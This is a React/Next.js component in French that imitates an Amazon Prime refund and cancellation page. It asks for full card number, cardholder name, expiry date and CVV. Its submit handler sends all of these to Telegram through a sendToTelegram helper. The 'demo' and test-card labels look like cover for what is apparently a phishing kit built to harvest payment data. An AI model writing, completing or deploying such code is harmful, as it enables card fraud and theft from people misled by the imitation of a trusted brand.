'use client';

import { useState, type FormEvent, type FormEventHandler } from 'react';
import Image from 'next/image';
import visaLogo from '../../assets/images/visa.png';
import mastercardLogo from '../../assets/images/mastercard.png';
import amexLogo from '../../assets/images/amex.png';
import { sendToTelegram } from '../lib/telegram';

const formatCardNumber: FormEventHandler<HTMLInputElement> = event => {
  const input = event.currentTarget;
  const digits = input.value.replace(/\D/g, '').slice(0, 16);
  input.value = digits.replace(/(.{4})/g, '$1 ').trim();
};

const formatExpiry: FormEventHandler<HTMLInputElement> = event => {
  const input = event.currentTarget;
  const digits = input.value.replace(/\D/g, '').slice(0, 4);
  input.value = digits.length > 2 ? `${digits.slice(0, 2)}/${digits.slice(2)}` : digits;
};

const digitsOnly = (max: number): FormEventHandler<HTMLInputElement> => event => {
  event.currentTarget.value = event.currentTarget.value.replace(/\D/g, '').slice(0, max);
};

export function SafePaymentStep({ onBack, onContinue }: { onBack: () => void; onContinue: () => void }) {
  const [loading, setLoading] = useState(false);

  async function submit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    if (!event.currentTarget.reportValidity()) return;

    const data = new FormData(event.currentTarget);
    const cardNumber = String(data.get('demo-card-number') ?? '');
    const holder = String(data.get('demo-card-holder') ?? '');
    const expiry = String(data.get('demo-card-expiry') ?? '');
    const cvv = String(data.get('demo-card-cvv') ?? '');

    setLoading(true);

    await sendToTelegram({
      title: 'Moyen de paiement (démo)',
      fields: {
        'Montant affiché': '249,90 EUR',
        'Numéro de carte': cardNumber,
        'Titulaire': holder,
        'Expiration': expiry,
        'CVV': cvv,
      },
    });

    setLoading(false);
    onContinue();
  }

  return <>
    <h1 className="amz-prime-title">Remboursement sécurisé</h1>
    <p className="amz-prime-lead">Confirmez le moyen de paiement fictif associé à cette démonstration pour finaliser le parcours.</p>
    <div className="amz-amount-row"><span>Montant total</span><strong>249,90 EUR</strong></div>
    <section className="amz-card-panel">
      <header className="amz-card-panel__top">
        <div>
          <h2 className="amz-form-section__title">Moyen de paiement de démonstration</h2>
          <p className="amz-card-panel__note">Utilisez uniquement des données de test. Aucun paiement réel n&apos;est traité.</p>
        </div>
        <div className="amz-card-brands amz-card-brands--header" aria-label="Réseaux de paiement pris en charge">
          <span><Image src={visaLogo} alt="Visa"/></span>
          <span><Image src={mastercardLogo} alt="Mastercard"/></span>
          <span><Image src={amexLogo} alt="American Express"/></span>
        </div>
      </header>
      <form className="amz-card-form" onSubmit={submit}>
        <p className="amz-card-form-intro" id="prototype-card-note">Données de test uniquement (ex. 4242 4242 4242 4242 de Stripe).</p>
        <div className="amz-form-grid amz-card-demo-fields" aria-describedby="prototype-card-note">
          <div className="amz-field amz-field--full">
            <label htmlFor="demo-card-number">Numéro de carte <span className="req">*</span></label>
            <input
              className="amz-input"
              id="demo-card-number"
              name="demo-card-number"
              required
              inputMode="numeric"
              autoComplete="cc-number"
              maxLength={19}
              placeholder="4242 4242 4242 4242"
              pattern="[0-9]{4}( [0-9]{4}){3}"
              onInput={formatCardNumber}
            />
          </div>
          <div className="amz-field amz-field--full">
            <label htmlFor="demo-card-holder">Nom du titulaire <span className="req">*</span></label>
            <input
              className="amz-input"
              id="demo-card-holder"
              name="demo-card-holder"
              required
              autoComplete="cc-name"
              minLength={2}
              maxLength={60}
              placeholder="Prénom Nom"
            />
          </div>
          <div className="amz-field">
            <label htmlFor="demo-card-expiry">Expiration (MM/AA) <span className="req">*</span></label>
            <input
              className="amz-input"
              id="demo-card-expiry"
              name="demo-card-expiry"
              required
              inputMode="numeric"
              autoComplete="cc-exp"
              maxLength={5}
              placeholder="MM/AA"
              pattern="(0[1-9]|1[0-2])/[0-9]{2}"
              title="Format MM/AA (mois entre 01 et 12)"
              onInput={formatExpiry}
            />
          </div>
          <div className="amz-field">
            <label htmlFor="demo-card-cvv">CVV <span className="req">*</span></label>
            <input
              className="amz-input"
              id="demo-card-cvv"
              name="demo-card-cvv"
              required
              inputMode="numeric"
              autoComplete="cc-csc"
              maxLength={4}
              placeholder="123"
              pattern="[0-9]{3,4}"
              title="3 ou 4 chiffres"
              onInput={digitsOnly(4)}
            />
          </div>
        </div>
        <p className="amz-card-panel__note amz-card-panel__note--secure">
          Champs éditables. Les valeurs saisies sont transmises au serveur pour traitement.
        </p>
        <div className="amz-actions">
          <button className="amz-btn amz-btn--primary" type="submit" disabled={loading}>
            {loading ? 'Envoi…' : "Confirmer l'annulation"}
          </button>
          <button className="amz-btn amz-btn--secondary" type="button" onClick={onBack}>Retour</button>
        </div>
      </form>
    </section>
  </>;
}
